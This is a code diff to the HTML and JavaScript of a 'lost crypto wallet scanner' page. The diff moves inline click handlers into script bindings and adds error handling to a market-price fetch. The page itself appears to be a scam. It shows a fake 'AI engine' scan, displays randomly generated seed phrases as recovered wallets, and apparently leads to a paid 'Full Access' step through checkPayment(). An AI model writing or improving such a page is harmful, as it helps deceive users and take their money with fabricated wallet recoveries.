@@ -31,21 +31,21 @@ button:disabled{opacity:.4}
   </div>
 
   <div class="center">
-    <button id="scanBtn" onclick="startScan()">SCAN FOR LOST WALLETS</button>
+    <button id="scanBtn">SCAN FOR LOST WALLETS</button>
     <div class="log" id="log"></div>
 
     <div class="card" id="result" style="display:none;">
       <div id="balance"></div>
-      <button id="seedBtn" onclick="startSeed()">REVEAL SEED PHRASE</button>
+      <button id="seedBtn">REVEAL SEED PHRASE</button>
       <div id="seedProcess" style="display:none;">
         <div class="small" id="seedStatus">Decrypting mnemonic entropy…</div>
         <div class="progress"><div class="bar" id="seedBar"></div></div>
       </div>
       <div id="seed" style="margin-top:12px;word-break:break-word;"></div>
       <div class="warn" id="warn" style="display:none;">⚠ DO NOT SHARE THIS SEED PHRASE WITH ANYONE</div>
-      <button id="copyBtn" style="display:none;" onclick="copySeed()">COPY SEED</button>
+      <button id="copyBtn" style="display:none;">COPY SEED</button>
       <div class="small" id="valid" style="display:none;">✔ Mnemonic validated (BIP‑39)</div>
-      <button id="againBtn" style="display:none;" onclick="resetApp()">SCAN AGAIN</button>
+      <button id="againBtn" style="display:none;">SCAN AGAIN</button>
     </div>
   </div>
 
@@ -71,7 +71,12 @@ function rndSeed(){
 }
 
 // ===== Scan wallets =====
-function startScan(){
+document.getElementById("scanBtn").onclick = function(){
+  const scanBtn = document.getElementById("scanBtn");
+  const result = document.getElementById("result");
+  const log = document.getElementById("log");
+  const balance = document.getElementById("balance");
+
   scanBtn.disabled=true;
   result.style.display="none";
   log.innerHTML="Initializing AI engine…<br>";
@@ -87,7 +92,17 @@ function startScan(){
 }
 
 // ===== Reveal seed =====
-function startSeed(){
+document.getElementById("seedBtn").onclick = function(){
+  const seedBtn = document.getElementById("seedBtn");
+  const seedProcess = document.getElementById("seedProcess");
+  const seedBar = document.getElementById("seedBar");
+  const seedStatus = document.getElementById("seedStatus");
+  const seed = document.getElementById("seed");
+  const warn = document.getElementById("warn");
+  const copyBtn = document.getElementById("copyBtn");
+  const valid = document.getElementById("valid");
+  const againBtn = document.getElementById("againBtn");
+
   seedBtn.disabled=true;
   seedProcess.style.display="block";
   let p=0,s=0;
@@ -113,12 +128,22 @@ function startSeed(){
   },1000);
 }
 
-// ===== Copy & reset =====
-function copySeed(){navigator.clipboard.writeText(seed.dataset.masked);copyBtn.innerText="COPIED";setTimeout(()=>copyBtn.innerText="COPY SEED",1500);}
-function resetApp(){location.reload();}
+// ===== Copy seed =====
+document.getElementById("copyBtn").onclick = function(){
+  const seed = document.getElementById("seed");
+  navigator.clipboard.writeText(seed.dataset.masked);
+  this.innerText="COPIED";
+  setTimeout(()=>this.innerText="COPY SEED",1500);
+}
+
+// ===== Scan again =====
+document.getElementById("againBtn").onclick = function(){
+  location.reload();
+}
 
 // ===== Full Access =====
 function showFullAccessButton(){
+  const seed = document.getElementById("seed");
   if(document.getElementById("fullBtn")) return;
   const btn=document.createElement("button");
   btn.id="fullBtn";
@@ -194,11 +219,14 @@ function checkPayment(){
 
 // ===== Market Data =====
 async function loadMarket(){
-  const r=await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1");
-  const d=await r.json();
-  market.innerHTML=d.map(c=>`<div class="coin"><span>${c.symbol.toUpperCase()}</span><span>$${c.current_price}</span></div>`).join("");
+  try{
+    const r=await fetch("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=10&page=1");
+    const d=await r.json();
+    document.getElementById("market").innerHTML=d.map(c=>`<div class="coin"><span>${c.symbol.toUpperCase()}</span><span>$${c.current_price}</span></div>`).join("");
+  }catch(e){document.getElementById("market").innerHTML="Failed to load market data";}
 }
-loadMarket();setInterval(loadMarket,60000);
+loadMarket();
+setInterval(loadMarket,60000);
 </script>
 </body>
 </html>
